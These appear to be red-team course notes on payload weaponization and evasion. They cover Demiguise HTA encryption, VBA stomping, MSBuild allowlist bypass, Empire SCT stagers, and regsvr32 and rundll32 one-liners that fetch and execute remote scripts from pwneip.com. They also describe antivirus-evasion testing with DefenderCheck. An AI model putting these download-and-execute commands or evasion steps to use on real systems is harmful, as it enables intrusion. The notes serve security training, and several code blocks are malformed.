---
title: Weaponization
date: 2025-11-06 00:00:00 +0000
categories: [Sans Red-Team 2025 Lessons]
tags: [sans, red-team]
---


Custom Executables
Weaponization
• Methods of obfuscation
Packing
Encoding
 Modifying source
Remove extraneous functionality
Remove usage statements and signatured strings
– Recompilation
• A deep topic that is thoroughly studied in:
– SANS SEC670: Red Team Operations – Developing Custom Tools for
Windows

# Blending In Windows Script Host (WSH)

Three popular scripting
technologies at our disposal
– Visual Basic
– JavaScript
– PowerShell

Scripting offensive actions is quick and easily modifiable
Windows Script Host, allows the execution of scripts
Supported languages
– Visual Basic Script
– JavaScript

```bash
Red Team Tip: Use the /t <num of seconds> to set a kill timer on the script
```bash
# Demiguise: HTA Encryption Tool

NCC Group released Demiguise, an HTA encryption tool
Generates an HTML file with encrypted HTA (using RC4)
Target visits page, fetches key, and HTA is decrypted
File-type will show text/html instead of HTA

```
C:\> python demiguise.py -k hello -c "notepad.exe" -p
Outlook.Application -o test.hta
```bash
```python
To use Demiguise, download the Python script and use the following flags:
-k for the encryption key
-p for the payload
-l will list the payloads
-c command to run from the HTA
-o output of the HTA file
References:
https://attack.mitre.org/techniques/T1027/
https://github.com/nccgroup/demiguise

## VBA

***T1564.007 VBA Stomping is the act of making the VBA look like
benign data by overwriting the source with zeroes, benign code, or
random bytes

https://github.com/outflanknl/EvilClippy

# MSBuild

Microsoft Build Engine is a platform for building applications
Based off an XML schema for a project file
Casey Smith (@subTee) discovered that MSBuild.exe could be
used to proxy execution through the trusted binary
Steve Borosh (@424f424f) later released NoMSBuild to execute
this technique without the use of MSBuild.exe

***Application allow listing bypass and malicious code execution***

```bash
C:\> MSBuild.exe payload.xml
C:\> MSBuild.exe payload.csproj
```
```html
References:
https://attack.mitre.org/techniques/T1127/001/
https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild?view=vs-2019
https://blog.talosintelligence.com/2020/02/building-bypass-with-msbuild.html
https://github.com/rvrsh3ll/NoMSBuild


# Living Off the Land Binaries and Scripts (LOLBAS)

A LOLBin/Lib/Script must:
 Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft
• Have extra "unexpected" functionality
    – Exceptions are application control bypasses
• Have functionality that would be useful to
an APT or red team

https://lolbas-project.github.io/

**Explore.exe can execute things**

RunDLL

# Regsvr32 (3rd most popular)

Regsvr32.exe is used by Windows to register DLLs
Bypasses application control (trusted by Microsoft)
Can pull files from network or internet (proxy aware) via TLS
Executed in memory, does not touch disk

```
C:\> regsvr32 /s /n /u /i:https://pwneip.com/payload.sct
scrobj.dll
```bash
C:\> regsvr32 /s /n /u /i:https://pwneip.com/payload.sct scrobj.dll
• Silently without displaying any messages /s
• To not call the DLL Register Server /n
• To use the unregister method /u

**Paylod for this has to be .SCT file**

.SCT = .xml file with 

```bash
<script language="JScript">
```bash
### How it works:

- Use regsrv32 to fetch a .SCT file from the internet
- WScript.Shell will spawn a .cmd
- cmd will run PowerShell (Encoded launcher that will call back over the internet)


Empire SCT
This slide shows screenshots from an Empire SCT launcher file and the execution from a Windows host.

To generate the file in Empire:
(Empire: listeners) > usestager windows/launcher_sct
(Empire: stager/windows/macro) > set Listener http
(Empire: stager/windows/macro) > generate

By default, Empire saves it to: /tmp/launcher.sct

The file is then hosted on a web server:
$ sudo python –m SimpleHTTPServer 443

Then on the Windows system, it is executed:
C:\> regsvr32 /s /n /u /i:https://pwneip.com/laucher.sct scrobj.dll

# Rundll32

**Loads and runs DLLs**

Execute arbitrary payloads, scripts or Control Panel files (.cpl)

```
Control_RunDLL and Control_RunDLLAsUser
```bash
Execute JavaScript that runs a remote PS script:

```bash
C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication
";document.write();new%20ActiveXObject("WScript.Shell").Run
("powershell -nop -exec bypass -c IEX (New-Object
Net.WebClient).DownloadString('https://pwneip.com/payload.p
s1');")
```bash
JavaScript that runs a remote JS:

```
C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication
";document.write();GetObject("script:https://pwneip.com/pay
load.ps1")
```bash
# Shortcuts

• Create new shortcut
• Edit an existing shortcut
• Map the shortcut file to an
arbitrary file with parameters
• Payload can be
– Rundll32
– PowerShell
– Regsvr32
– Executable on disk

Shortcuts or symbolic links are ways of referencing other files or applications that will be opened or executed
when the shortcut is clicked by a user. Red teams can use shortcuts to execute their own payloads for initial
access or persistence. A new shortcut can be created, or it can be edited to change the target path. This pertains to
*nix systems as well and often called symbolic links.
The target or reference file of the shortcut can be modified to execute several different execution and evasion
bypass methods discussed. In the slide, you can see the rundll32.exe method. To make the shortcut more
believable, change the icon and name.
Reference:
https://attack.mitre.org/techniques/T1547/009/

# Payload Testing

With the payload created, insert it in the respective file for delivery
Most C2 frameworks will do this for you
- Metasploit's MSFvenom
- Empire's stager generation
- Covenant's grunt payloads
- Magic Unicorn from Dave Kennedy is a great tool

Execute the payload on a test system
– Fully patched or patched to target environment
– Same security products
– Record results

Unicorn supports your own shellcode, cobalt strike
beacons, and Metasploit meterpreter payloads. 

# DefenderCheck

Uses PowerShell to test binaries against Windows Defender
Takes a binary as input
Splits until it pinpoints the exact trigger
Prints those offending bytes to the screen
Very helpful when trying to identify the
specific bad pieces of executable code in your tool/payload
Recompile the binary after obfuscating

https://github.com/matterpreter/DefenderCheck

# C# Solution

Powershell is harder to use, so C# become more useful
Uses the Common Language Runtime (CLR)
Can port C# to PowerShell and reverse

# GhostPack

**C# implementations of many techniques we covered**

• GhostPack:

Seatbelt: Host and network discovery
SharpUp: Privilege escalation
SharpRoast: Kerberoasting
SharpDump: Dump memory of processes
SafetyKatz: Safe Mimikatz
SharpWMI: C# wrapper for WMI


